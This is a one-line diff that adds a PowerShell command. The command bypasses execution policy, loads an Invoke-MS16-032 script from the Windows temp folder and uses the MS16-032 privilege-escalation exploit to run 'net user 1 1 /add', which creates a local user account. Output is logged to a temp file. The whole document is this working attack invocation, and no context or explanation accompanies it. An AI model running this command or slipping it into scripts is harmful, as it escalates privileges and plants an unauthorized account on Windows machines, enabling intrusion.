@@ -1,0 +1,1 @@
+powershell.exe -exec bypass -Command "& {Import-Module C:\windows\temp\Invoke-MS16-032.ps1;Invoke-MS16-032 -Application cmd.exe -Commandline '/c net user 1 1 / add'}" > C:\windows\temp\Invoke-MS16-032.log
